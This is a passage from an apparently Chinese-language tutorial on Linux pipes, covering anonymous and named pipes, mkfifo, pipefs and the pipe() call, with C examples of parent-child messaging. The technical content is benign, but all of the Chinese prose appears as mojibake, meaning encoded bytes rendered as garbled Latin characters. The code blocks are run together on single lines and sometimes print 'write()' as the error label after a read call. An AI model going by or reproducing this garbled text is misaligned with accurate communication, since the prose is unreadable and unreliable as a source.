·å‰é¢å†™å®Œåé¢è¯»ï¼Œäºæ˜¯å°±å®ç°äº†é€šä¿¡ã€‚å®é™…ä¸Šç®¡é“çš„è®¾è®¡ä¹Ÿæ˜¯éµå¾ªUNIXçš„â€œä¸€åˆ‡çš†æ–‡ä»¶â€è®¾è®¡åŸåˆ™çš„ï¼Œå®ƒæœ¬è´¨ä¸Šå°±æ˜¯ä¸€ä¸ªæ–‡ä»¶ã€‚Linuxç³»ç»Ÿç›´æ¥æŠŠç®¡é“å®ç°æˆäº†ä¸€ç§æ–‡ä»¶ç³»ç»Ÿï¼Œå€ŸåŠ©VFSç»™åº”ç”¨ç¨‹åºæä¾›æ“ä½œæ¥å£ã€‚</p><p>è™½ç„¶å®ç°å½¢æ€ä¸Šæ˜¯æ–‡ä»¶ï¼Œä½†æ˜¯ç®¡é“æœ¬èº«å¹¶ä¸å ç”¨ç£ç›˜æˆ–è€…å…¶ä»–å¤–éƒ¨å­˜å‚¨çš„ç©ºé—´ã€‚åœ¨Linuxçš„å®ç°ä¸Šï¼Œå®ƒå ç”¨çš„æ˜¯å†…å­˜ç©ºé—´ã€‚æ‰€ä»¥ï¼ŒLinuxä¸Šçš„ç®¡é“å°±æ˜¯ä¸€ä¸ªæ“ä½œæ–¹å¼ä¸ºæ–‡ä»¶çš„å†…å­˜ç¼“å†²åŒºã€‚</p></div><h2 id="ç®¡é“çš„åˆ†ç±»å’Œä½¿ç”¨"><strong>ç®¡é“çš„åˆ†ç±»å’Œä½¿ç”¨</strong></h2><div class="story post-story"><p>Linuxä¸Šçš„ç®¡é“åˆ†ä¸¤ç§ç±»å‹ï¼š</p><ol><li>åŒ¿åç®¡é“</li><li>å‘½åç®¡é“</li></ol><p>è¿™ä¸¤ç§ç®¡é“ä¹Ÿå«åšæœ‰åæˆ–æ— åç®¡é“ã€‚åŒ¿åç®¡é“æœ€å¸¸è§çš„å½¢æ€å°±æ˜¯æˆ‘ä»¬åœ¨shellæ“ä½œä¸­æœ€å¸¸ç”¨çš„â€|â€ã€‚å®ƒçš„ç‰¹ç‚¹æ˜¯åªèƒ½åœ¨çˆ¶å­è¿›ç¨‹ä¸­ä½¿ç”¨ï¼Œçˆ¶è¿›ç¨‹åœ¨äº§ç”Ÿå­è¿›ç¨‹å‰å¿…é¡»æ‰“å¼€ä¸€ä¸ªç®¡é“æ–‡ä»¶ï¼Œç„¶åforkäº§ç”Ÿå­è¿›ç¨‹ï¼Œè¿™æ ·å­è¿›ç¨‹é€šè¿‡æ‹·è´çˆ¶è¿›ç¨‹çš„è¿›ç¨‹åœ°å€ç©ºé—´è·å¾—åŒä¸€ä¸ªç®¡é“æ–‡ä»¶çš„æè¿°ç¬¦ï¼Œä»¥è¾¾åˆ°ä½¿ç”¨åŒä¸€ä¸ªç®¡é“é€šä¿¡çš„ç›®çš„ã€‚æ­¤æ—¶é™¤äº†çˆ¶å­è¿›ç¨‹å¤–ï¼Œæ²¡äººçŸ¥é“è¿™ä¸ªç®¡é“æ–‡ä»¶çš„æè¿°ç¬¦ï¼Œæ‰€ä»¥é€šè¿‡è¿™ä¸ªç®¡é“ä¸­çš„ä¿¡æ¯æ— æ³•ä¼ é€’ç»™å…¶ä»–è¿›ç¨‹ã€‚è¿™ä¿è¯äº†ä¼ è¾“æ•°æ®çš„å®‰å…¨æ€§ï¼Œå½“ç„¶ä¹Ÿé™ä½äº†ç®¡é“äº†é€šç”¨æ€§ï¼Œäºæ˜¯ç³»ç»Ÿè¿˜æä¾›äº†å‘½åç®¡é“ã€‚</p><p>æˆ‘ä»¬å¯ä»¥ä½¿ç”¨mkfifoæˆ–mknodå‘½ä»¤æ¥åˆ›å»ºä¸€ä¸ªå‘½åç®¡é“ï¼Œè¿™è·Ÿåˆ›å»ºä¸€ä¸ªæ–‡ä»¶æ²¡æœ‰ä»€ä¹ˆåŒºåˆ«ï¼š</p><pre class="language-js" data-language="js"><code class="language-js"><span class="token punctuation">[</span>zorro@zorro<span class="token operator">-</span>pc pipe<span class="token punctuation">]</span>$ mkfifo pipe<span class="token punctuation">[</span>zorro@zorro<span class="token operator">-</span>pc pipe<span class="token punctuation">]</span>$ ls <span class="token operator">-</span>l pipe prw<span class="token operator">-</span>r<span class="token operator">--</span>r<span class="token operator">--</span> <span class="token number">1</span> zorro zorro <span class="token number">0</span> Jul <span class="token number">14</span> <span class="token number">10</span><span class="token operator">:</span><span class="token number">44</span> pipe</code></pre><p>å¯ä»¥çœ‹åˆ°åˆ›å»ºå‡ºæ¥çš„æ–‡ä»¶ç±»å‹æ¯”è¾ƒç‰¹æ®Šï¼Œæ˜¯pç±»å‹ã€‚è¡¨ç¤ºè¿™æ˜¯ä¸€ä¸ªç®¡é“æ–‡ä»¶ã€‚æœ‰äº†è¿™ä¸ªç®¡é“æ–‡ä»¶ï¼Œç³»ç»Ÿä¸­å°±æœ‰äº†å¯¹ä¸€ä¸ªç®¡é“çš„å…¨å±€åç§°ï¼Œäºæ˜¯ä»»ä½•ä¸¤ä¸ªä¸ç›¸å…³çš„è¿›ç¨‹éƒ½å¯ä»¥é€šè¿‡è¿™ä¸ªç®¡é“æ–‡ä»¶è¿›è¡Œé€šä¿¡äº†ã€‚æ¯”å¦‚æˆ‘ä»¬ç°åœ¨è®©ä¸€ä¸ªè¿›ç¨‹å†™è¿™ä¸ªç®¡é“æ–‡ä»¶ï¼š</p><pre class="language-js" data-language="js"><code class="language-js"><span class="token punctuation">[</span>zorro@zorro<span class="token operator">-</span>pc pipe<span class="token punctuation">]</span>$ echo xxxxxxxxxxxxxx <span class="token operator">></span> pipe </code></pre><p>æ­¤æ—¶è¿™ä¸ªå†™æ“ä½œä¼šé˜»å¡ï¼Œå› ä¸ºç®¡é“å¦ä¸€ç«¯æ²¡æœ‰äººè¯»ã€‚è¿™æ˜¯å†…æ ¸å¯¹ç®¡é“æ–‡ä»¶å®šä¹‰çš„é»˜è®¤è¡Œä¸ºã€‚æ­¤æ—¶å¦‚æœæœ‰è¿›ç¨‹è¯»è¿™ä¸ªç®¡é“ï¼Œé‚£ä¹ˆè¿™ä¸ªå†™æ“ä½œçš„é˜»å¡æ‰ä¼šè§£é™¤ï¼š</p><pre class="language-js" data-language="js"><code class="language-js"><span class="token punctuation">[</span>zorro@zorro<span class="token operator">-</span>pc pipe<span class="token punctuation">]</span>$ cat pipe xxxxxxxxxxxxxx</code></pre><p>å¤§å®¶å¯ä»¥è§‚å¯Ÿåˆ°ï¼Œå½“æˆ‘ä»¬catå®Œè¿™ä¸ªæ–‡ä»¶ä¹‹åï¼Œå¦ä¸€ç«¯çš„echoå‘½ä»¤ä¹Ÿè¿”å›äº†ã€‚è¿™å°±æ˜¯å‘½åç®¡é“ã€‚</p><p>Linuxç³»ç»Ÿæ— è®ºå¯¹äºå‘½åç®¡é“å’ŒåŒ¿åç®¡é“ï¼Œåº•å±‚éƒ½ç”¨çš„æ˜¯åŒä¸€ç§æ–‡ä»¶ç³»ç»Ÿçš„æ“ä½œè¡Œä¸ºï¼Œè¿™ç§æ–‡ä»¶ç³»ç»Ÿå«pipefsã€‚å¤§å®¶å¯ä»¥åœ¨/etc/proc/filesystemsæ–‡ä»¶ä¸­æ‰¾åˆ°ä½ çš„ç³»ç»Ÿæ˜¯ä¸æ˜¯æ”¯æŒè¿™ç§æ–‡ä»¶ç³»ç»Ÿï¼š</p><pre class="language-js" data-language="js"><code class="language-js"><span class="token punctuation">[</span>zorro@zorro<span class="token operator">-</span>pc pipe<span class="token punctuation">]</span>$ cat <span class="token operator">/</span>proc<span class="token operator">/</span>filesystems <span class="token operator">|</span>grep pipefsnodev    pipefs</code></pre><p>è§‚å¯Ÿå®Œäº†å¦‚ä½•åœ¨å‘½ä»¤è¡Œä¸­ä½¿ç”¨ç®¡é“ä¹‹åï¼Œæˆ‘ä»¬å†æ¥çœ‹çœ‹å¦‚ä½•åœ¨ç³»ç»Ÿç¼–ç¨‹ä¸­ä½¿ç”¨ç®¡é“ã€‚</p></div><h2 id="PIPE"><strong>PIPE</strong></h2><div class="story post-story"><p>æˆ‘ä»¬å¯ä»¥æŠŠåŒ¿åç®¡é“å’Œå‘½åç®¡é“åˆ†åˆ«å«åšPIPEå’ŒFIFOã€‚è¿™ä¸»è¦å› ä¸ºåœ¨ç³»ç»Ÿç¼–ç¨‹ä¸­ï¼Œåˆ›å»ºåŒ¿åç®¡é“çš„ç³»ç»Ÿè°ƒç”¨æ˜¯pipe()ï¼Œè€Œåˆ›å»ºå‘½åç®¡é“çš„å‡½æ•°æ˜¯mkfifo()ã€‚ä½¿ç”¨mknod()ç³»ç»Ÿè°ƒç”¨å¹¶æŒ‡å®šæ–‡ä»¶ç±»å‹ä¸ºä¸ºS_IFIFOä¹Ÿå¯ä»¥åˆ›å»ºä¸€ä¸ªFIFOã€‚</p><p>ä½¿ç”¨pipe()ç³»ç»Ÿè°ƒç”¨å¯ä»¥åˆ›å»ºä¸€ä¸ªåŒ¿åç®¡é“ï¼Œè¿™ä¸ªç³»ç»Ÿè°ƒç”¨çš„åŸå‹ä¸ºï¼š</p><pre class="language-js" data-language="js"><code class="language-js">#include <span class="token operator">&lt;</span>unistd<span class="token punctuation">.</span>h<span class="token operator">></span>int <span class="token function">pipe</span><span class="token punctuation">(</span>int pipefd<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>è¿™ä¸ªæ–¹æ³•å°†ä¼šåˆ›å»ºå‡ºä¸¤ä¸ªæ–‡ä»¶æè¿°ç¬¦ï¼Œå¯ä»¥ä½¿ç”¨pipefdè¿™ä¸ªæ•°ç»„æ¥å¼•ç”¨è¿™ä¸¤ä¸ªæè¿°ç¬¦è¿›è¡Œæ–‡ä»¶æ“ä½œã€‚pipefd[0]æ˜¯è¯»æ–¹å¼æ‰“å¼€ï¼Œä½œä¸ºç®¡é“çš„è¯»æè¿°ç¬¦ã€‚pipefd[1]æ˜¯å†™æ–¹å¼æ‰“å¼€ï¼Œä½œä¸ºç®¡é“çš„å†™æè¿°ç¬¦ã€‚ä»ç®¡é“å†™ç«¯å†™å…¥çš„æ•°æ®ä¼šè¢«å†…æ ¸ç¼“å­˜ç›´åˆ°æœ‰äººä»å¦ä¸€ç«¯è¯»å–ä¸ºæ­¢ã€‚æˆ‘ä»¬æ¥çœ‹ä¸€ä¸‹å¦‚ä½•åœ¨ä¸€ä¸ªè¿›ç¨‹ä¸­ä½¿ç”¨ç®¡é“ï¼Œè™½ç„¶è¿™ä¸ªä¾‹å­å¹¶æ²¡æœ‰ä»€ä¹ˆæ„ä¹‰ï¼š</p><pre class="language-js" data-language="js"><code class="language-js"><span class="token punctuation">[</span>zorro@zorro<span class="token operator">-</span>pc pipe<span class="token punctuation">]</span>$ cat pipe<span class="token punctuation">.</span>c#include <span class="token operator">&lt;</span>stdlib<span class="token punctuation">.</span>h<span class="token operator">></span>#include <span class="token operator">&lt;</span>stdio<span class="token punctuation">.</span>h<span class="token operator">></span>#include <span class="token operator">&lt;</span>unistd<span class="token punctuation">.</span>h<span class="token operator">></span>#include <span class="token operator">&lt;</span>string<span class="token punctuation">.</span>h<span class="token operator">></span>#define <span class="token constant">STRING</span> <span class="token string">"hello world!"</span>int <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    int pipefd<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    char buf<span class="token punctuation">[</span><span class="token constant">BUFSIZ</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">pipe</span><span class="token punctuation">(</span>pipefd<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token function">perror</span><span class="token punctuation">(</span><span class="token string">"pipe()"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">write</span><span class="token punctuation">(</span>pipefd<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token constant">STRING</span><span class="token punctuation">,</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token constant">STRING</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token function">perror</span><span class="token punctuation">(</span><span class="token string">"write()"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">read</span><span class="token punctuation">(</span>pipefd<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> buf<span class="token punctuation">,</span> <span class="token constant">BUFSIZ</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token function">perror</span><span class="token punctuation">(</span><span class="token string">"write()"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%s\n"</span><span class="token punctuation">,</span> buf<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><p>è¿™ä¸ªç¨‹åºåˆ›å»ºäº†ä¸€ä¸ªç®¡é“ï¼Œå¹¶ä¸”å¯¹ç®¡é“å†™äº†ä¸€ä¸ªå­—ç¬¦ä¸²ä¹‹åä»ç®¡é“è¯»å–ï¼Œå¹¶æ‰“å°åœ¨æ ‡å‡†è¾“å‡ºä¸Šã€‚ç”¨ä¸€ä¸ªå›¾æ¥è¯´æ˜è¿™ä¸ªç¨‹åºçš„çŠ¶æ€å°±æ˜¯è¿™æ ·çš„ï¼š</p><p><img src="https://s2.loli.net/2022/05/25/4R1Hn3tYEIvJLwk.png" class="lazyload" data-srcset="https://s2.loli.net/2022/05/25/4R1Hn3tYEIvJLwk.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="img"></p><p>ä¸€ä¸ªè¿›ç¨‹è‡ªå·±ç»™è‡ªå·±å‘é€æ¶ˆæ¯è¿™å½“ç„¶ä¸å«è¿›ç¨‹é—´é€šä¿¡ï¼Œæ‰€ä»¥å®é™…æƒ…å†µä¸­æˆ‘ä»¬ä¸ä¼šåœ¨å•ä¸ªè¿›ç¨‹ä¸­ä½¿ç”¨ç®¡é“ã€‚è¿›ç¨‹åœ¨pipeåˆ›å»ºå®Œç®¡é“ä¹‹åï¼Œå¾€å¾€éƒ½è¦forkäº§ç”Ÿå­è¿›ç¨‹ï¼Œæˆä¸ºå¦‚ä¸‹å›¾è¡¨ç¤ºçš„æ ·å­ï¼š</p><p><img src="https://s2.loli.net/2022/05/25/8ZmbMV5jCcYfzFl.png" class="lazyload" data-srcset="https://s2.loli.net/2022/05/25/8ZmbMV5jCcYfzFl.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="img"></p><p>å¦‚å›¾ä¸­æè¿°ï¼Œforkäº§ç”Ÿçš„å­è¿›ç¨‹ä¼šç»§æ‰¿çˆ¶è¿›ç¨‹å¯¹åº”çš„æ–‡ä»¶æè¿°ç¬¦ã€‚åˆ©ç”¨è¿™ä¸ªç‰¹æ€§ï¼Œçˆ¶è¿›ç¨‹å…ˆpipeåˆ›å»ºç®¡é“ä¹‹åï¼Œå­è¿›ç¨‹ä¹Ÿä¼šå¾—åˆ°åŒä¸€ä¸ªç®¡é“çš„è¯»å†™æ–‡ä»¶æè¿°ç¬¦ã€‚ä»è€Œå®ç°äº†çˆ¶å­ä¸¤ä¸ªè¿›ç¨‹ä½¿ç”¨ä¸€ä¸ªç®¡é“å¯ä»¥å®ŒæˆåŠåŒå·¥é€šä¿¡ã€‚æ­¤æ—¶ï¼Œçˆ¶è¿›ç¨‹å¯ä»¥é€šè¿‡fd[1]ç»™å­è¿›ç¨‹å‘æ¶ˆæ¯ï¼Œå­è¿›ç¨‹é€šè¿‡fd[0]è¯»ã€‚å­è¿›ç¨‹ä¹Ÿå¯ä»¥é€šè¿‡fd[1]ç»™çˆ¶è¿›ç¨‹å‘æ¶ˆæ¯ï¼Œçˆ¶è¿›ç¨‹ç”¨fd[0]è¯»ã€‚ç¨‹åºå®ä¾‹å¦‚ä¸‹ï¼š</p><pre class="language-js" data-language="js"><code class="language-js"><span class="token punctuation">[</span>zorro@zorro<span class="token operator">-</span>pc pipe<span class="token punctuation">]</span>$ cat pipe_parent_child<span class="token punctuation">.</span>c#include <span class="token operator">&lt;</span>stdlib<span class="token punctuation">.</span>h<span class="token operator">></span>#include <span class="token operator">&lt;</span>stdio<span class="token punctuation">.</span>h<span class="token operator">></span>#include <span class="token operator">&lt;</span>unistd<span class="token punctuation">.</span>h<span class="token operator">></span>#include <span class="token operator">&lt;</span>string<span class="token punctuation">.</span>h<span class="token operator">></span>#include <span class="token operator">&lt;</span>sys<span class="token operator">/</span>types<span class="token punctuation">.</span>h<span class="token operator">></span>#include <span class="token operator">&lt;</span>sys<span class="token operator">/</span>wait<span class="token punctuation">.</span>h<span class="token operator">></span>#define <span class="token constant">STRING</span> <span class="token string">"hello world!"</span>int <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    int pipefd<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    pid_t pid<span class="token punctuation">;</span>    char buf<span class="token punctuation">[</span><span class="token constant">BUFSIZ</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">pipe</span><span class="token punctuation">(</span>pipefd<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token function">perror</span><span class="token punctuation">(</span><span class="token string">"pipe()"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    pid <span class="token operator">=</span> <span class="token function">fork</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>pid <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token function">perror</span><span class="token punctuation">(</span><span class="token string">"fork()"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>pid <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token comment">/* this is child. */</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Child pid is: %d\n"</span><span class="token punctuation">,</span> <span class="token function">getpid</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">read</span><span class="token punctuation">(</span>pipefd<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> buf<span class="token punctuation">,</span> <span class="token constant">BUFSIZ</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token function">perror</span><span class="token punctuation">(</span><span class="token string">"write()"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%s\n"</span><span class="token punctuation">,</span> buf<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">bzero</span><span class="token punctuation">(</span>buf<span class="token punctuation">,</span> <span class="token constant">BUFSIZ</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">snprintf</span><span class="token punctuation">(</span>buf<span class="token punctuation">,</span> <span class="token constant">BUFSIZ</span><span class="token punctuation">,</span> <span class="token string">"Message from child: My pid is: %d"</span><span class="token punctuation">,</span> <span class="token function">getpid</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">write</span><span class="token punctuation">(</span>pipefd<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> buf<span class="token punctuation">,</span> <span class="token function">strlen</span><span class="token punctuation">(</span>buf<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token function">perror</span><span class="token punctuation">(</span><span class="token string">"write()"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>        <span class="token comment">/* this is parent */</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Parent pid is: %d\n"</span><span class="token punctuation">,</span> <span class="token function">getpid</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">snprintf</span><span class="token punctuation">(</span>buf<span class="token punctuation">,</span> <span class="token constant">BUFSIZ</span><span class="token punctuation">,</span> <span class="token string">"Message from parent: My pid is: %d"</span><span class="token punctuation">,</span> <span class="token function">getpid</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">write</span><span class="token punctuation">(</span>pipefd<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> buf<span class="token punctuation">,</span> <span class="token function">strlen</span><span class="token punctuation">(</span>buf<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token function">perror</span><span class="token punctuation">(</span><span class="token string">"write()"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token function">sleep</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">bzero</span><span class="token punctuation">(</span>buf<span class="token punctuation">,</span> <span class="token constant">BUFSIZ</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">read</span><span class="token punctuation">(</span>pipefd<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> buf<span class="token punctuation">,</span> <span class="token constant">BUFSIZ</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token function">perror</span><span class="token punctuation">(</span><span class="token string">"write()"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%s\n"</span><span class="token punctuation">,</span> buf<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">wait</span><span class="token punctuation">(</span><span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><p>çˆ¶è¿›ç¨‹å…ˆç»™å­è¿›ç¨‹å‘ä¸€ä¸ªæ¶ˆæ¯ï¼Œå­è¿›ç¨‹æ¥æ”¶åˆ°ä¹‹åæ‰“å°æ¶ˆæ¯ï¼Œä¹‹åå†ç»™çˆ¶è¿›ç¨‹å‘æ¶ˆæ¯ï¼Œçˆ¶è¿›ç¨‹å†æ‰“å°ä»å­è¿›ç¨‹æ¥æ”¶åˆ°çš„æ¶ˆæ¯ã€‚ç¨‹åºæ‰§è¡Œæ•ˆæœï¼š</p><pre class="language-js" data-language="js"><code class="language-js"><span class="token punctuation">[</span>zorro@zorro<span class="token operator">-</span>pc pipe<span class="token punctuation">]</span>$ <span class="token punctuation">.</span><span class="token operator">/</span>pipe_parent_child Parent pid is<span class="token operator">:</span> <span class="token number">8309</span>Child pid is<span class="token operator">:</span> <span class="token number">8310</span>Message from parent<span class="token operator">:</span> My pid is<span class="token operator">:</span> <span class="token number">8309</span>Message from child<span class="token operator">:</span> My pid is<span class="token operator">:</span> <span class="token number">8310</span></code></pre><p>ä»è¿™ä¸ªç¨‹åºä¸­æˆ‘ä»¬å¯ä»¥çœ‹åˆ°ï¼Œç®¡é“å®é™…ä¸Šå¯ä»¥å®ç°ä¸€ä¸ªåŠåŒå·¥é€šä¿¡çš„æœºåˆ¶ã€‚ä½¿ç”¨åŒä¸€ä¸ªç®¡é“çš„çˆ¶å­è¿›ç¨‹å¯ä»¥åˆ†æ—¶ç»™å¯¹æ–¹å‘é€æ¶ˆæ¯ã€‚æˆ‘ä»¬ä¹Ÿå¯ä»¥çœ‹åˆ°å¯¹ç®¡é“è¯»å†™çš„ä¸€äº›ç‰¹ç‚¹ï¼Œå³ï¼š</p><p>åœ¨ç®¡é“ä¸­æ²¡æœ‰æ•°æ®çš„æƒ…å†µä¸‹ï¼Œå¯¹ç®¡é“çš„è¯»æ“ä½œä¼šé˜»å¡ï¼Œç›´åˆ°ç®¡é“å†…æœ‰æ•°æ®ä¸ºæ­¢ã€‚å½“ä¸€æ¬¡å†™çš„æ•°æ®é‡ä¸è¶…è¿‡ç®¡é“å®¹é‡çš„æ—¶å€™ï¼Œå¯¹ç®¡é“çš„å†™æ“ä½œä¸€èˆ¬ä¸ä¼šé˜»å¡ï¼Œç›´æ¥å°†è¦å†™çš„æ•°æ®å†™å…¥ç®¡é“ç¼“å†²åŒºå³å¯ã€‚</p><p>å½“ç„¶å†™æ“ä½œä¹Ÿä¸ä¼šå†æ‰€æœ‰æƒ…å†µä¸‹éƒ½ä¸é˜»å¡ã€‚è¿™é‡Œæˆ‘ä»¬è¦å…ˆæ¥äº†è§£ä¸€ä¸‹ç®¡é“çš„å†…æ ¸å®ç°ã€‚ä¸Šæ–‡è¯´è¿‡ï¼Œç®¡é“å®é™…ä¸Šå°±æ˜¯å†…æ ¸æ§åˆ¶çš„ä¸€ä¸ªå†…å­˜ç¼“å†²åŒºï¼Œæ—¢ç„¶æ˜¯ç¼“å†²åŒºï¼Œå°±æœ‰å®¹é‡ä¸Šé™ã€‚æˆ‘ä»¬æŠŠç®¡é“ä¸€æ¬¡æœ€å¤šå¯ä»¥ç¼“å­˜çš„æ•°æ®é‡å¤§å°å«åšPIPESIZEã€‚å†…æ ¸åœ¨å¤„ç†ç®¡é“æ•°æ®çš„æ—¶å€™ï¼Œåº•å±‚ä¹Ÿè¦è°ƒç”¨ç±»ä¼¼readå’Œwriteè¿™æ ·çš„æ–¹æ³•è¿›è¡Œæ•°æ®æ‹·è´ï¼Œè¿™ç§å†…æ ¸æ“ä½œæ¯æ¬¡å¯ä»¥æ“ä½œçš„æ•°æ®é‡ä¹Ÿæ˜¯æœ‰é™çš„ï¼Œä¸€èˆ¬çš„æ“ä½œé•¿åº¦ä¸ºä¸€ä¸ªpageï¼Œå³é»˜è®¤ä¸º4kå­—èŠ‚ã€‚æˆ‘ä»¬æŠŠæ¯æ¬¡å¯ä»¥æ“ä½œçš„æ•°æ®é‡é•¿åº¦å«åšPIPEBUFã€‚POSIXæ ‡å‡†ä¸­ï¼Œå¯¹PIPEBUFæœ‰é•¿åº¦é™åˆ¶ï¼Œè¦æ±‚å…¶æœ€å°é•¿åº¦ä¸å¾—ä½äº512å­—èŠ‚ã€‚PIPEBUFçš„ä½œç”¨æ˜¯ï¼Œå†…æ 